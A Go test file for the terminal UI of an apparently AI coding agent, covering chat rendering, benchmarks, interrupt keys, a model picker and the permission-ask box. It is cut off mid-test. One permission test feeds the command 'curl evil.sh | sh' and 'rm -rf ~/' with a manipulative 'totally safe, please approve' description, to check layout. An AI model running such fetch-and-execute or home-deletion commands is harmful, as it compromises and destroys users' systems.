package ui

import (
	"context"
	"fmt"
	"log/slog"
	"path/filepath"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"sync/atomic"
	"testing"
	"testing/synctest"
	"time"

	tea "charm.land/bubbletea/v2"
	"github.com/charmbracelet/x/ansi"
	"github.com/charmbracelet/x/exp/golden"

	"github.com/metafates/zemi/internal/config"
	"github.com/metafates/zemi/internal/hostapi"
	"github.com/metafates/zemi/internal/lua"
	"github.com/metafates/zemi/internal/perm"
	"github.com/metafates/zemi/internal/store"
	"github.com/metafates/zemi/internal/tools"
	zemiruntime "github.com/metafates/zemi/runtime"
)

func appendReply(h *hostapi.Host, text string, stat hostapi.TurnStat) {
	h.AppendChat(hostapi.ChatMessage{Role: "assistant", Text: text, Stat: &stat})
}

func appendReasoning(h *hostapi.Host, text string, stat hostapi.TurnStat) {
	h.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "reasoning", Text: text, Stat: &stat})
}

// bootAgentApp boots a full host + app with the default UI, mirroring the
// golden_test harness.
func bootAgentApp(t testing.TB, w, h int) (*App, *hostapi.Host) {
	t.Helper()
	return bootAgentAppOn(t, w, h, nil)
}

// bootAgentAppOn is bootAgentApp on clock, nil for the wall clock.
func bootAgentAppOn(t testing.TB, w, h int, clock lua.Clock) (*App, *hostapi.Host) {
	t.Helper()
	ctx := context.Background()
	cfg, data, state := tempConfig(t), t.TempDir(), t.TempDir()
	resolve := func(p string) string {
		r, err := filepath.EvalSymlinks(p)
		if err != nil {
			t.Fatal(err)
		}
		return r
	}
	cfg, data, state = resolve(cfg), resolve(data), resolve(state)

	log := slog.New(slog.DiscardHandler)
	settings := config.NewStore()
	classes := lua.PathClasses{
		{Prefix: cfg, Origin: lua.OriginUser},
		{Prefix: filepath.Join(data, "plugins"), Origin: lua.OriginPlugin},
	}
	rt := lua.NewRuntime(lua.RuntimeOptions{Log: log, PathClass: classes, RuntimeFS: zemiruntime.FS, Clock: clock})
	host := hostapi.NewHost(rt, log, settings, config.Dirs{ConfigHome: cfg, DataHome: data, StateHome: state})
	app := NewApp(host, log)
	host.SetUIHooks(app)
	app.CaptureHooks()

	steps := []lua.BootStep{host.NamespacesStep(), lua.RequireStep("zemi.tui")}
	if err := rt.Boot(ctx, steps); err != nil {
		t.Fatalf("boot: %v", err)
	}
	app.Update(tea.WindowSizeMsg{Width: w, Height: h})
	app.timeStr = "12:34"
	app.now = func() time.Time { return time.UnixMilli(500) }
	return app, host
}

// seedLongChat fills the session with turns of reasoning, tool rows, a diff
// and a markdown reply.
func seedLongChat(host *hostapi.Host, turns int) {
	const reply = "## Heading\n\nA paragraph of the reply with `inline code` and **bold** that wraps across the chat width and then some more words.\n\n```go\nfunc example(a, b int) int {\n\tif a > b {\n\t\treturn a - b\n\t}\n\treturn b - a\n}\n```\n\n- item one\n- item two\n"
	const diff = "--- a/x.go\n+++ b/x.go\n@@ -1,6 +1,7 @@\n package x\n \n-func a() {}\n+func a() int { return 1 }\n+func b() {}\n \n // tail\n"
	for i := range turns {
		host.AppendMessage("user", fmt.Sprintf("question %d about the build", i))
		appendReasoning(host, "thinking about it for a while", hostapi.TurnStat{})
		host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "read", Text: "internal/ui/app.go", Status: "ok"})
		host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "edit", Text: "internal/ui/x.go", Status: "ok", Diff: diff})
		appendReply(host, reply, hostapi.TurnStat{Out: 200})
	}
}

// frameTurns: a long transcript costs a frame only a slice of its line
// headers, never converting or wrapping its lines again.
var frameTurns = []int{10, 500}

// BenchmarkStreamingFrame is one frame while a reply streams: the widget
// re-renders and only the streamed rows are converted and wrapped again.
func BenchmarkStreamingFrame(b *testing.B) {
	for _, turns := range frameTurns {
		b.Run(strconv.Itoa(turns), func(b *testing.B) {
			app, host := bootAgentApp(b, 140, 40)
			seedLongChat(host, turns)
			app.renderSync(b)
			for i := 0; b.Loop(); i++ {
				host.SeedStream(hostapi.StreamSnapshot{Active: true, Text: fmt.Sprintf("streaming token %d", i)})
				app.frameGen++
				app.renderSync(b)
				_ = app.Frame()
			}
		})
	}
}

// seedResumedChat is a long session whose units take the chat's budget to
// render.
func seedResumedChat(host *hostapi.Host, turns int) {
	for i := range turns {
		host.AppendMessage("user", fmt.Sprintf("question %d", i))
		appendReply(host, strings.Repeat(fmt.Sprintf("A paragraph of reply %d with `code` and **bold** that wraps across the chat width.\n\n", i), 28), hostapi.TurnStat{})
	}
}

// BenchmarkColdChatRender is the first chat render of a long resumed
// session, which the chat's budget bounds.
func BenchmarkColdChatRender(b *testing.B) {
	app, host := bootAgentApp(b, 140, 40)
	seedResumedChat(host, 500)
	chat := host.Widgets.Get("chat")
	for b.Loop() {
		host.ToggleReasoning() // every unit renders again
		if _, _, err := host.RenderWidget(b.Context(), chat, 138, 30, app.uiState()); err != nil {
			b.Fatal(err)
		}
	}
}

// lagClock is a machine so slow or loaded that every read of the clock is
// a second after the last: each render budget is spent before it starts.
type lagClock struct{ s atomic.Int64 }

func (c *lagClock) Now() time.Time { return time.Unix(c.s.Add(1), 0) }

func (c *lagClock) AfterFunc(d time.Duration, f func()) func() bool {
	return time.AfterFunc(d, f).Stop
}

// TestColdChatRender: however slow the machine, the first chat render of a
// long resumed session fills the view and tops it with the prompt the view
// pins, however many rows answer that prompt, and leaves the rest to the
// renders it asks for; a reader scrolled up keeps their place while a render
// fills in again.
func TestColdChatRender(t *testing.T) {
	const turns = 50 // an exchange is ~58 lines
	longTurn := func(host *hostapi.Host) {
		host.AppendMessage("user", "question 0")
		for i := range 100 {
			appendReasoning(host, "thinking", hostapi.TurnStat{})
			host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "read", Text: "x.go", Status: "ok"})
			appendReply(host, fmt.Sprintf("reply %d", i), hostapi.TurnStat{})
		}
	}
	for _, c := range []struct {
		name   string
		seed   func(*hostapi.Host)
		height int
		has    [2]string
		hasNot string
	}{
		{"view", func(h *hostapi.Host) { seedResumedChat(h, turns) }, 30, [2]string{"question 49", "reply 49"}, "question 48"},
		{"exchange shorter than the view", func(h *hostapi.Host) { seedResumedChat(h, turns) }, 100, [2]string{"question 48", "reply 49"}, "question 47"},
		{"one long turn", longTurn, 30, [2]string{"question 0", "reply 99"}, "reply 50"},
	} {
		t.Run(c.name, func(t *testing.T) {
			app, host := bootAgentAppOn(t, 140, 40, &lagClock{})
			c.seed(host)
			chat := host.Widgets.Get("chat")
			var lines [][]hostapi.Segment
			has := func(s string) bool {
				return slices.ContainsFunc(lines, func(l []hostapi.Segment) bool { return strings.Contains(hostapi.SegsText(l)+" ", s+" ") })
			}
			for n, more := 0, true; more; n++ {
				var err error
				if lines, more, err = host.RenderWidget(t.Context(), chat, 138, c.height, app.uiState()); err != nil {
					t.Fatal(err)
				}
				if len(lines) == 0 || n == 0 && !more || n > 500 {
					t.Fatalf("render %d: %d lines, more %v", n, len(lines), more)
				}
				if n == 0 && (!has(c.has[0]) || !has(c.has[1]) || has(c.hasNot)) {
					t.Fatalf("the first render has %q %v, %q %v, %q %v", c.has[0], has(c.has[0]), c.has[1], has(c.has[1]), c.hasNot, has(c.hasNot))
				}
			}
			if !strings.Contains(hostapi.SegsText(lines[0]), "question 0") || !has("reply 0") {
				t.Fatalf("the fill ends without the first exchange: %d lines from %q", len(lines), hostapi.SegsText(lines[0]))
			}
		})
	}

	app, host := bootAgentAppOn(t, 140, 40, &lagClock{})
	seedResumedChat(host, turns)
	app.renderSync(t)
	app.Frame()
	for range 60 {
		app.applyScroll("up", "")
	}
	app.Frame()
	st := app.scrolls[app.scrollDef]
	top, anchor := st.top, slices.Clone(st.anchor)
	host.ToggleReasoning()
	app.frameGen++
	for more := true; more; app.Frame() {
		var lines [][]hostapi.Segment
		var err error
		if lines, more, err = host.RenderWidget(t.Context(), host.Widgets.Get("chat"), st.rect.Dx(), st.rect.Dy(), app.uiState()); err != nil {
			t.Fatal(err)
		}
		app.onWidgetRendered(widgetRender{id: "chat", lines: lines, more: more, width: st.rect.Dx(), height: st.rect.Dy(), gen: app.frameGen})
	}
	if st.top != top || !slices.Equal(st.anchor, anchor) {
		t.Fatalf("view moved from row %d %q to row %d %q", top, anchor, st.top, st.anchor)
	}
}

// TestChatExpandSettledRow: a settled turn folds what it looked at into one
// TestRailWindow: a long rail keeps its last six entries and folds the earlier
// ones behind one row, which a click opens and closes. A printed run lists
// everything.
func TestRailWindow(t *testing.T) {
	app, host := bootAgentApp(t, 100, 30)
	host.AppendMessage("user", "look around")
	for i := range 10 {
		host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "shell", Text: "ls", Label: fmt.Sprintf("list dir %d", i), Status: "ok"})
	}
	appendReply(host, "done", hostapi.TurnStat{})
	rows := func() []string {
		lines, _, err := host.RenderWidget(t.Context(), host.Widgets.Get("chat"), 98, 20, app.uiState())
		if err != nil {
			t.Fatal(err)
		}
		out := make([]string, 0, len(lines))
		for _, l := range lines {
			out = append(out, strings.TrimRight(hostapi.SegsText(l), " "))
		}
		return out
	}
	click := func(id string) []string {
		if err := host.ClickWidget(t.Context(), "chat", map[string]any{"id": id}); err != nil {
			t.Fatal(err)
		}
		return rows()
	}
	rows() // the first render forgets what was opened before it
	// the opened run shows its last six entries behind one for the rest
	got := click("turn:2")
	if !slices.Contains(got, "│ … 4 earlier") || slices.Contains(got, "│ list dir 3") || !slices.Contains(got, "│ list dir 4") || !slices.Contains(got, "│ list dir 9") {
		t.Fatalf("the rail is not windowed:\n%s", strings.Join(got, "\n"))
	}
	if got = click("more:2"); !slices.Contains(got, "│ … show the last 6") || !slices.Contains(got, "│ list dir 0") {
		t.Fatalf("the window does not open:\n%s", strings.Join(got, "\n"))
	}
	if got = click("more:2"); !slices.Contains(got, "│ … 4 earlier") {
		t.Fatalf("the window does not close:\n%s", strings.Join(got, "\n"))
	}
	if printed := printedChat(t, host, 98); strings.Contains(printed, "earlier") || !strings.Contains(printed, "list dir 0") {
		t.Fatalf("a printed run is windowed:\n%s", printed)
	}
}

// digest row, and a click on it opens that run's rail under the digest, the
// rest of the transcript coming from the chat's cache. A thought row's click
// unrolls its text at the prose measure with a bar-only row above and below,
// and the digest's second click folds the run again.
func TestChatExpandSettledRow(t *testing.T) {
	app, host := bootAgentApp(t, 140, 30)
	host.AppendMessage("user", "run it")
	appendReasoning(host, strings.Repeat("plan it word by word ", 8)+"\n\nthen build", hostapi.TurnStat{ThoughtMS: 6000})
	host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "shell", Text: "make", Status: "ok", Output: "built\nok"})
	appendReasoning(host, "done then", hostapi.TurnStat{ThoughtMS: 400})
	appendReply(host, "done", hostapi.TurnStat{})
	rows := func() []string {
		lines, _, err := host.RenderWidget(t.Context(), host.Widgets.Get("chat"), 138, 20, app.uiState())
		if err != nil {
			t.Fatal(err)
		}
		out := make([]string, len(lines))
		for i, l := range lines {
			out[i] = strings.TrimRight(hostapi.SegsText(l), " ")
		}
		return out
	}
	click := func(id string) []string {
		if err := host.ClickWidget(t.Context(), "chat", map[string]any{"id": id}); err != nil {
			t.Fatal(err)
		}
		return rows()
	}
	const digest = "· 1 command · thought 6.4s"
	closed := rows()
	if !slices.Contains(closed, digest) || slices.ContainsFunc(closed, func(r string) bool { return strings.Contains(r, "make") }) {
		t.Fatalf("the settled turn does not fold into its digest:\n%s", strings.Join(closed, "\n"))
	}
	// the digest stays as the run's header over a rail whose thought rows are
	// framed above and below, running or done
	open := click("turn:2")
	at := slices.Index(open, digest)
	rail := []string{"│", "│ ✻ thought 6.0s", "│", "│ run make", "│", "│ ✻ thought 0.4s", "│"}
	if at < 0 || !slices.Equal(open[at+1:at+1+len(rail)], rail) {
		t.Fatalf("the opened run:\n%s", strings.Join(open, "\n"))
	}
	// a thought's click unrolls its text between the air framing it, at the
	// prose measure
	text := click("thought:2")
	var body []string
	for _, r := range text[at+3:] {
		if r == "│" && len(body) > 0 {
			break
		}
		body = append(body, r)
	}
	if len(body) < 3 {
		t.Fatalf("the thought's text is not unrolled:\n%s", strings.Join(text, "\n"))
	}
	for _, r := range body[1:] {
		if r != "│" && (!strings.HasPrefix(r, "│   ") || ansi.StringWidth(r) > 4+80) {
			t.Fatalf("a thought row off the rail or past the measure: %q", r)
		}
	}
	if folded := click("turn:2"); !slices.Equal(folded, closed) {
		t.Fatalf("a second click does not fold the run:\n%s", strings.Join(folded, "\n"))
	}
	// what was opened in the run has no row left to close it by, so folding
	// closed it
	if reopened := click("turn:2"); !slices.Equal(reopened, open) {
		t.Fatalf("the run reopens as it first opened:\n%s", strings.Join(reopened, "\n"))
	}
}

// TestTurnStats: the readout rides only the reply that ends the exchange, and
// each call counts its own diff.
func TestTurnStats(t *testing.T) {
	app, host := bootAgentApp(t, 100, 30)
	rows := func() []string {
		app.renderSync(t)
		var out []string
		for row := range strings.SplitSeq(ansi.Strip(app.Frame()), "\r\n") {
			if row != "" && strings.TrimSpace(row) != "" {
				out = append(out, strings.Join(strings.Fields(row), " "))
			}
		}
		return out[:len(out)-3] // the composer
	}
	host.AppendMessage("user", "fix it")
	host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "edit", Text: "a.go", Status: "ok", Diff: "--- a.go\n+++ a.go\n@@ -1,2 +1,2 @@\n-old\n+new\n keep"})
	host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "edit", Text: "b.go", Status: "ok", Diff: "--- b.go\n+++ b.go\n@@ -1 +1 @@\n-x\n+y"})
	// a sentence between two runs, with a readout of its own stored on it
	appendReply(host, "a check for it:", hostapi.TurnStat{In: 100, Out: 100, ElapsedMS: 900, Ended: 1_700_000_000})
	host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "shell", Text: "go test", Status: "ok"})
	appendReply(host, "done", hostapi.TurnStat{In: 100, Out: 200, ElapsedMS: 1500, Ended: 1_700_000_000})
	host.SeedStream(hostapi.StreamSnapshot{})
	app.AgentStream()
	ended := rows()
	for _, want := range []string{"│ ✓ edit a.go +1 -1", "│ ✓ edit b.go +1 -1"} {
		if !slices.Contains(ended, want) {
			t.Fatalf("missing %q, each call counts its own:\n%s", want, strings.Join(ended, "\n"))
		}
	}
	if slices.ContainsFunc(ended, func(r string) bool { return strings.Contains(r, "+2") || strings.Contains(r, "-2") }) {
		t.Fatalf("a summed diff shows:\n%s", strings.Join(ended, "\n"))
	}
	if n := strings.Count(strings.Join(ended, "\n"), "0.9s"); n != 0 {
		t.Fatalf("a sentence between runs carries a readout:\n%s", strings.Join(ended, "\n"))
	}
	if n := strings.Count(strings.Join(ended, "\n"), "1.5s · 200 out · "); n != 1 {
		t.Fatalf("the reply that ends the exchange carries the readout:\n%s", strings.Join(ended, "\n"))
	}
}

// BenchmarkIdleFrame is a frame with nothing changed since the last one.
func BenchmarkIdleFrame(b *testing.B) {
	for _, turns := range frameTurns {
		b.Run(strconv.Itoa(turns), func(b *testing.B) {
			app, host := bootAgentApp(b, 140, 40)
			seedLongChat(host, turns)
			app.renderSync(b)
			for b.Loop() {
				_ = app.Frame()
			}
		})
	}
}

// waitPrompt pumps queued hook messages onto the owning goroutine until
// cond turns true (blocking hooks answer from other goroutines; capture
// mode keeps every state mutation here).
func waitPrompt(t *testing.T, app *App, cond func() bool) {
	t.Helper()
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		for app.Pump() {
		}
		if cond() {
			return
		}
		time.Sleep(time.Millisecond)
	}
	t.Fatal("prompt did not open within 2s")
}

// TestGoldenPermission pins the Go-owned permission ask (DESIGN §6.2, §8):
// Go chrome, the title saying where a command runs, the facts table, the
// badge, the answers, and the always answer delivered to the asker.
func TestGoldenPermission(t *testing.T) {
	script := "set -e; for pkg in $(go list ./internal/...); do go test -count=1 -run TestGolden \"$pkg\" 2>&1 | tee -a \"$TMPDIR/golden.log\"; done; grep -c FAIL \"$TMPDIR/golden.log\" || true; rm -rf ~/.cache/zemi-golden && git stash list | head -5"
	diff := "--- a/internal/ui/agent.go\n+++ b/internal/ui/agent.go\n@@ -41,5 +41,5 @@\n func (a *App) permBox(pa *permAskPrompt, w, h int) [][]hostapi.Segment {\n \treq := pa.req\n-\tisDiff := strings.HasPrefix(req.Preview, \"--- \")\n+\tisDiff := req.Subject == perm.SubjectWrite && req.Preview != \"\"\n \tmaxW := 96\n"
	for _, c := range []struct {
		name string
		w, h int
		req  hostapi.PermRequest
	}{
		{"unsandboxed-80x40", 80, 40, hostapi.PermRequest{
			Tool: "shell", Subject: "tool.shell", Arg: script, Where: hostapi.RunsOutside,
			Runs:        perm.Normalize(script).Programs(""),
			Reason:      "the model asked to leave the sandbox",
			Description: "Run the golden tests one package at a time, then clear the cache",
			Always:      "allow go list, go test and 6 more outside the sandbox", Project: true,
		}},
		{"edit-diff-120x30", 120, 30, hostapi.PermRequest{
			Tool: "edit", Subject: "fs.write", Arg: "internal/ui/agent.go", Preview: diff,
			Reason: "this changes a file outside cmd/, the directory zemi was started in",
			Always: "allow edits in internal/ui/ and below",
		}},
		{"network-subagent-80x24", 80, 24, hostapi.PermRequest{
			Tool: "shell", Subject: "tool.shell", Arg: "npm ci && npm run build", Where: hostapi.RunsNetwork,
			Runs:  perm.Normalize("npm ci && npm run build").Programs(""),
			Agent: "general agent", Reason: "the model asked for the network",
			Description: "Install dependencies and build the site", Always: "allow npm ci and npm run with the network",
		}},
		{"plugin-tool-80x30", 80, 30, hostapi.PermRequest{
			Tool: "jira_create", Subject: "tool.jira_create", Arg: "jira_create", Owner: "plugin:jira",
			Preview: `{"project":"ZEM","type":"Task","summary":"Permission prompt lists the programs a command runs","labels":["ui","permissions"]}`,
			Reason:  "zemi cannot tell what this tool does", Always: "allow the jira_create tool",
		}},
	} {
		t.Run(c.name, func(t *testing.T) {
			app, _ := bootAgentApp(t, c.w, c.h)
			done := make(chan struct{})
			var allowed bool
			var by string
			go func() {
				allowed, by = app.AskPermission(c.req)
				close(done)
			}()
			waitPrompt(t, app, func() bool { return app.permAsk != nil })
			app.renderSync(t)
			golden.RequireEqual(t, app.Frame())
			app.Update(tea.KeyPressMsg{Code: 'a', Text: "a"})
			<-done
			if !allowed || by != "user:always" {
				t.Fatalf("allowed=%v by=%q", allowed, by)
			}
		})
	}
}

// Which ask surfaces first is not fixed, so exactly one is denied.
func TestPermissionDenyOneAtATime(t *testing.T) {
	app, host := bootAgentApp(t, 70, 16)
	pipe := host.PipelineFor()
	res := make(chan bool, 2)
	for _, req := range []tools.Request{{Subject: "fs.write", Arg: "/etc/hosts", Reason: "edit hosts"}, {Subject: "tool.shell", Arg: "make test"}} {
		go func() { res <- pipe.Check(req).Decision == perm.Allow }()
	}
	waitPrompt(t, app, func() bool { return app.permAsk != nil && host.AsksWaiting() == 2 })
	app.renderSync(t)
	first := app.permAsk
	app.Update(tea.KeyPressMsg{Code: 'n', Text: "n"})
	waitPrompt(t, app, func() bool { return app.permAsk != first && app.permAsk != nil })
	if app.permAsk.size != first.size {
		t.Fatalf("the next prompt must open in the answered box: %+v, was %+v", app.permAsk.size, first.size)
	}
	app.Update(tea.KeyPressMsg{Code: 'o', Text: "o"})
	if a, b := <-res, <-res; a == b {
		t.Fatalf("exactly one ask must be denied: %v %v", a, b)
	}
	if len(host.Perm.Rules()) != 0 {
		t.Fatalf("once must not store rules: %+v", host.Perm.Rules())
	}
	waitPrompt(t, app, func() bool { return app.permAsk == nil })
	app.permAsk = &permAskPrompt{} // answered, and the Refresh that drops it lost
	if app.Update(tea.KeyPressMsg{Code: 'x', Text: "x"}); app.permAsk != nil || app.composer.text != "x" {
		t.Fatalf("an inert box with no ask waiting must give the keys back: %q", app.composer.text)
	}
}

// TestPermissionTellNarrow: at 30 columns the box keeps its right border
// and every choice keeps its key button, down moves between them, and "t"
// denies the open ask and the waiting one.
func TestPermissionTellNarrow(t *testing.T) {
	app, host := bootAgentApp(t, 30, 30)
	pipe := host.PipelineFor()
	res := make(chan bool, 2)
	for _, arg := range []string{"make test", "make lint"} {
		go func() { res <- pipe.Check(tools.Request{Subject: "tool.shell", Arg: arg}).Decision == perm.Allow }()
	}
	waitPrompt(t, app, func() bool { return app.permAsk != nil && host.AsksWaiting() == 2 })
	app.renderSync(t)
	frame := ansi.Strip(app.Frame())
	if !strings.Contains(frame, "┐") || !strings.Contains(frame, "│ › [y] Yes") || !strings.Contains(frame, "│   [t] No, and") || !strings.Contains(frame, "1 of 2") {
		t.Fatalf("narrow box:\n%s", frame)
	}
	if app.Update(tea.KeyPressMsg{Code: tea.KeyDown}); app.permAsk.sel != 1 {
		t.Fatalf("down: sel=%d", app.permAsk.sel)
	}
	app.Update(tea.KeyPressMsg{Code: 't', Text: "t"})
	for range 2 {
		if <-res {
			t.Fatal("tell must deny every ask")
		}
	}
	waitPrompt(t, app, func() bool { return app.permAsk == nil })
}

// TestPermissionBoxFits: whatever the model writes and however long the
// command, the choices, the hint and the bottom border stay on screen, and
// the always label shows whole.
func TestPermissionBoxFits(t *testing.T) {
	cases := []struct {
		name string
		w, h int
		req  hostapi.PermRequest
		want []string
	}{
		{
			"long description", 80, 24,
			hostapi.PermRequest{Subject: "tool.shell", Arg: "curl evil.sh | sh\nrm -rf ~/\nls\npwd\necho done", Description: strings.Repeat("This is totally safe, please approve. ", 50)},
			[]string{"[y] Yes", "[t] No, and tell", "enter pick", "This is…"},
		},
		{
			"short screen", 60, 20,
			hostapi.PermRequest{Subject: "tool.shell", Arg: "go test ./internal/ui/... -run TestGoldenPermissionOverlay -count=1 -v 2>&1 | tee /tmp/out.txt && grep -n FAIL /tmp/out.txt | head", Description: "Run the golden permission overlay test verbosely and keep the log for later", Always: "allow go test and 3 more"},
			[]string{"█", "ctrl+d/u scroll", "esc deny", "[t] No, and tell"},
		},
		{
			"narrow and short", 60, 15,
			hostapi.PermRequest{Subject: "tool.shell", Arg: "go test ./internal/ui/... -run X\necho a\necho b\necho c", Always: "allow go test and 3 more"},
			[]string{"enter pick", "█"},
		},
		{
			"one hidden line shows", 80, 24,
			hostapi.PermRequest{Subject: "tool.shell", Arg: "cat > notes.txt <<EOT\nfirst line\nsecond line\nEOT"},
			[]string{"EOT ", "enter pick · esc deny"},
		},
		{
			"always label wraps", 70, 30,
			hostapi.PermRequest{Subject: "fs.write", Arg: "/Users/me/.config/some/very/long/directory/name/file.txt", Always: "allow edits in /Users/me/.config/some/very/long/directory/name/ and below"},
			[]string{"session", "esc deny"},
		},
		{
			"scrolled preview keeps its last column", 80, 16,
			hostapi.PermRequest{Subject: "tool.shell", Arg: strings.Repeat("abcdefghij", 60)},
			[]string{strings.Repeat("abcdefghij", 7) + " █"},
		},
		{
			"runs outside sandbox", 80, 24,
			hostapi.PermRequest{Subject: "tool.shell", Arg: "git push origin main", Where: hostapi.RunsOutside, Reason: "the model asked to leave the sandbox"},
			[]string{"Run this command outside the sandbox?", "runs  unknown: read the command"},
		},
		{
			"a script's ask says so", 80, 24,
			hostapi.PermRequest{Subject: "tool.shell", Arg: "go test ./...", Script: "lua script"},
			[]string{"lua script"},
		},
		{
			"title beats a long badge", 80, 24,
			hostapi.PermRequest{Subject: "tool.shell", Arg: "rm -rf build", Where: hostapi.RunsOutside, Owner: "plugin:" + strings.Repeat("x", 80), Agent: "workflow 7c25f526 · general agent"},
			[]string{"Run this command outside the sandbox? ", "workflow 7c2"},
		},
		{
			"facts survive a short screen", 80, 16,
			hostapi.PermRequest{
				Subject: "tool.shell", Arg: strings.Repeat("rm -rf build && go build ./...\n", 20), Runs: []perm.Program{{Name: "rm", Risk: perm.RiskDeletes}, {Name: "go build"}},
				Reason: "this may delete many files", Description: "Rebuild from a clean tree", Always: "allow go build and 1 more",
			},
			[]string{"runs  rm (deletes) · go build", "why   this may delete many files", "[t] No, and tell", "█"},
		},
		{
			"long list cuts to +N more", 80, 24,
			hostapi.PermRequest{Subject: "tool.shell", Arg: "x", Runs: func() []perm.Program {
				var ps []perm.Program
				for i := range 30 {
					ps = append(ps, perm.Program{Name: fmt.Sprintf("program%02d", i)})
				}
				return append(ps, perm.Program{Name: "shred", Risk: perm.RiskDeletes})
			}()},
			[]string{"runs  shred (deletes) · program00", "more", "[t] No, and tell"},
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			app, _ := bootAgentApp(t, c.w, c.h)
			go app.AskPermission(c.req)
			waitPrompt(t, app, func() bool { return app.permAsk != nil })
			app.renderSync(t)
			frame := ansi.Strip(app.Frame())
			for _, want := range append(c.want, "└─") {
				if !strings.Contains(frame, want) {
					t.Fatalf("missing %q:\n%s", want, frame)
				}
			}
		})
	}
}

// TestGoldenModelPicker pins the model picker: zemi.model.pick returns at
// once, so the interpreter stays free while it is open, and enter runs /model <id>.
func TestGoldenModelPicker(t *testing.T) {
	app, host := bootAgentApp(t, 70, 20)
	runLua(t, app, `
		zemi.provider.add({ id = "anthropic", kind = "openai_compat", base_url = "http://x", api_key = "k", models = {
			{ id = "claude-sonnet-4-5", display = "Claude Sonnet 4.5" }, { id = "claude-haiku-4-5", display = "Claude Haiku 4.5" } } })
		zemi.provider.add({ id = "openai", kind = "openai_compat", base_url = "http://x", models = { { id = "gpt-5", display = "GPT-5" } } })
		zemi.model.set("anthropic/claude-sonnet-4-5")`)
	done := make(chan error, 1)
	go func() {
		done <- host.RT.ExecuteChunk(context.Background(), `zemi.model.pick()`, "test.lua", lua.OriginUser)
	}()
	select {
	case err := <-done:
		if err != nil {
			t.Fatal(err)
		}
	case <-time.After(time.Second):
		t.Fatal("zemi.model.pick holds the interpreter while the picker is open")
	}
	for app.Pump() {
	}

	app.Update(tea.KeyPressMsg{Code: tea.KeyDown}) // -> haiku
	app.Update(tea.KeyPressMsg{Code: tea.KeyDown}) // -> gpt-5
	app.renderSync(t)
	golden.RequireEqual(t, app.Frame())

	var ran string // main.go owns /model
	host.Commands.Add(&hostapi.Command{
		Name: "model", NArgs: "?", Origin: lua.OriginBuiltin, Gen: hostapi.Gen(1),
		GoFn: func(_ *hostapi.Host, args string) error { ran = args; return nil },
	})
	app.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if ran != "openai/gpt-5" {
		t.Fatalf("enter ran /model %q", ran)
	}
}

// TestGoldenAgentStream pins the live stream block in the chat widget
// (DESIGN §6.3): transcript, tool call lines with status marks, dim
// reasoning, the streaming reply, and the steering depth indicator.
func TestGoldenAgentStream(t *testing.T) {
	app, host := bootAgentApp(t, 80, 20)

	// the user's own text is plain; a reply keeps a generic that is no HTML
	host.AppendMessage("user", "why does Vec<String> in __init__ fail?")
	appendReply(host, "Read the build log: Vec<String> moved.", hostapi.TurnStat{
		In: 12340, Out: 1234, ThoughtMS: 4200, ElapsedMS: 38000,
	})
	host.SeedStream(hostapi.StreamSnapshot{
		Active:    true,
		Text:      "The test binary exits 1 because\nthe fixture path moved.",
		Reasoning: "checked go.mod, then the fixture dir", Thinking: true,
		Tools: []hostapi.StreamTool{
			{Name: "read", Input: "internal/fixtures/paths.go", Status: "ok"},
			{Name: "shell", Input: "go vet ./...", Label: "Vet the packages", Status: "ok"},
			{Name: "shell", Input: "go test ./... 2>&1 | tail -5", Status: "run"},
			{Name: "read", Input: "go.mod", Status: "wait"},
		},
		Steering:   []string{"also check go.mod"},
		Model:      "anthropic/claude-sonnet-4-5",
		Thought:    4 * time.Second,
		Elapsed:    12 * time.Second,
		SessionIn:  41200,
		SessionOut: 3800,
		LastIn:     24500,
		CtxWindow:  200000,
	})
	// A stream event lands through the hook path, bumping the frame.
	app.AgentStream()

	app.renderSync(t)
	golden.RequireEqual(t, app.Frame())

	if !app.host.AgentActive() {
		t.Fatal("seeded stream should read active")
	}
}

// TestInterruptKeys: esc interrupts a running turn on a second press within
// 2s and an agent view takes it as back; ctrl+c interrupts at once, clears a
// draft into the history, and on an empty composer arms quit. A held key
// prefix replays as plain keys when the next key breaks it or it times out,
// and ctrl+c drops it.
func TestInterruptKeys(t *testing.T) {
	esc, ctrlC, up := tea.KeyPressMsg{Code: tea.KeyEscape}, tea.KeyPressMsg{Code: 'c', Mod: tea.ModCtrl}, tea.KeyPressMsg{Code: tea.KeyUp}
	ctrlE, x := tea.KeyPressMsg{Code: 'e', Mod: tea.ModCtrl}, tea.KeyPressMsg{Code: 'x', Text: "x"}
	var wait tea.KeyPressMsg          // advances the clock 3s
	view := tea.KeyPressMsg{Code: -1} // opens an agent view
	for _, c := range []struct {
		name          string
		active, view  bool
		draft         string
		keys          []tea.KeyPressMsg
		cancel, armed bool
		composer, row string
	}{
		{"esc arms", true, false, "", []tea.KeyPressMsg{esc}, false, false, "", "esc again"},
		{"esc esc interrupts", true, false, "", []tea.KeyPressMsg{esc, esc}, true, false, "also this", "ctrl+c quit"},
		{"esc arms again after 3s", true, false, "", []tea.KeyPressMsg{esc, wait, esc}, false, false, "", "esc again"},
		{"esc in an agent view goes back and disarms", true, true, "", []tea.KeyPressMsg{esc, view, esc, esc}, false, false, "", "esc again"},
		{"ctrl+c interrupts at once", true, false, "", []tea.KeyPressMsg{ctrlC}, true, false, "also this", "ctrl+c quit"},
		{"ctrl+c clears a draft, up restores it", false, false, "draft", []tea.KeyPressMsg{ctrlC, up}, false, false, "draft", ""},
		{"ctrl+c on an empty composer arms quit", false, false, "", []tea.KeyPressMsg{ctrlC}, false, true, "", "ctrl+c quit"},
		{"a broken prefix replays", false, false, "abc", []tea.KeyPressMsg{ctrlE, x}, false, false, "abcx", ""},
		{"a timed out prefix replays", false, false, "abc", []tea.KeyPressMsg{ctrlE, wait, x}, false, false, "abcx", ""},
